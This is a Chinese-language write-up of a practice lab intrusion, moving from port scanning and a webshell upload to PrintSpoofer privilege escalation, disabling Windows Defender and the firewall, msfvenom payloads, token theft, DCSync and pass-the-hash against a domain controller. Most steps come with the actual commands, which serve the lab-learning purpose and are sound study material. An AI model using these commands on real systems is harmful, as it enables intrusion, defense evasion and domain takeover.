又一次艰难的靶场练习

这个靶场内网部分还算可以，但是外网打点稍微有些困难。安全狗真是给我搞得心态炸裂。。。（本文没有详述所有过程，只是记录一下主要的攻击步骤和方法）

这里直接给出拓扑图。

WEN服务器

首先我们对服务器进行端口扫描，nmap全端口扫描实在太慢了，这里用masscan

masscan -p 1-65535 192.168.1.150 --rate=1000

这里只会扫描出开放端口，不过得到开放端口后，我们就可以用nmap针对这些端口进行指纹扫描了

nmap -p 21,80,999,6588,5985 -sS -sC -v -A 192.168.0.114

80端口开着IISweb服务器，我们直接去访问（这里需要配置一个域名解析，否则访问不了）

192.168.0.1 www.moonlab.com

主页是空白的，这里得用目录扫描器扫描一下后台，但是用扫描器的结果会现实字典中的所有目录都存在，应该是有安全狗之类的东西，看一下

whatweb www.moonlab.com

还真是，这里我无论把线程放低还是增加睡眠都没法扫出来，无奈上网上瞅了一眼wp，但是网上的扫描器也是增加睡眠，拿过来后仍然扫不出结果。无奈之下，不争气的我直接拿别人扫出来的结果去访问了

这里看到了登陆界面，还是老规矩，我们上网上查一查有哪些已经爆出来的漏洞。

这里找到了一个后台密码重置漏洞，通过抓包修改设置完成攻击（这里图忘截了。。），最后带出密码

根据带出的密码尝试登陆。

这样我们已经登陆到了后台管理员界面，由于安全狗的存在，我们没法直接上传shell，只能找一些上传压缩包的地方上传：

从这里直接上传打包好的webshell就行，然后问题又来了，就算这样还是得做webshell的免杀，这有点触及到我的知识盲区了，尤其是aspx马，这里我们用冰蝎的马传上去看看。

连接成功，但是权限是真的低

所以先想办法提个权，我们选用打印机提权

可以看到这里的SeImpersonatePrivilege已经启用，那直接提权就行，工具和用法见itm4n/PrintSpoofer: Abusing Impersonation Privileges on Windows 10 and Server 2019 (github.com)

PrintSpoofer.exe -i -c "whoami"

可以成功提权，但这个只是单条命令执行的，我们希望拿到一个高权限的cmd

PrintSpoofer.exe -i -c cmd

一直没有反应，貌似是执行失败了。和msf的联动也没弹回来，那先查一下进程列表，用在线杀软识别找出正在运行的杀软。

tasklist /svc

windows defender。。。说实话这个杀软挺难过的，所以我们尝试换一种思路，关掉这个杀软，这里使用到了这个工具：https://github.com/APTortellini/DefenderSwitch

直接配合之前的打印机提权漏洞一起使用

PrintSpoofer.exe -i -c "DefenderSwitch.exe -off"

执行成功，再次使用在线杀软识别

已经成功关闭Windows Defender。 然后用msf生成木马上传，并监听，冰蝎这边用同上的方式配合打印机提权执行木马

PrintSpoofer.exe -i -c "shell.exe"

回连成功。

我这边msf和CS的联动一直有问题，所以这个session没法传给CS，所以只好再用CS生成一个木马上传,然后msf执行

已经弹了回来。

Windows Server 2012

然后扫描，毕竟我认为CS的扫描器还是不错的。只扫描内网网段即可

这里扫到了内网的另外一台主机和其开放的端口

接下来我们挂上代理去访问

又是一个信呼oa，我们之前打红日靶场的时候就打过，这次用一样的工具再打一次就行了，见记一次靶场练习-VulnStack-7 | Hexo (icesoula.github.io)

过程这里我就忽略了，这次上传的是个冰蝎的马，直接用冰蝎去连接

不仅连接上了，还是个高权限。

和刚才一样，我们查一下它有哪些杀软

只有一个360，那就比较好过了，不过由于防火墙开着导致我们挂上代理也无法访问到，所以我们需要先关上它的防火墙。

netsh advfirewall set allprofiles state off

成功，这里我之前写的是挂上代理去ping，后来一个学长提醒了我，icmp协议是走不了socks代理的，所以自然也是无法挂代理去ping的（现在想想，自己这句话说的真是有点蠢啊。。。）但这里也的确可以ping通，可能是由于网络环境配置有问题（当时配环境时大意了，以为内网机器无法出网就行了）

那接下来继续模拟真实环境，用正向马去打，但是这里需要做个免杀，这里我用的一个go的加载器直接在目标机器上加载十六进制文件。

msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=192.168.0.128 LPORT=4444 -f hex -o shell.hex

msf成功上线

Windows Server 2016(域控)

由于kiwi模块没抓到明文密码，所以先尝试抓令牌试试

load incognito
list_tokens -u    #查看当前主机内存中的令牌

系统中有域管的令牌，那我们直接窃取

impersonate_token "ATTACK\Administrator"

窃取的确是成功了，但是我们无法得到一个域管权限的shell，所以只能换种方式，这里用msf自带的kiwi模块中的dcsync来获取域管哈希。

load kiwi
dcsync administrator

有了hash后，就可以进行hash传递了。

use exploit/windows/smb/psexec
set rhosts 10.10.0.165
set smbuser administrator
set smbpass 00000000000000000000000000000000:f4466fca31070e080a7da76ac6d078c0  // 完整的Administrator用户的Hash，即LM Hash:NT Hash，LM Hash不知道的话可以用0补齐
set smbdomain attack.local
run

拿下
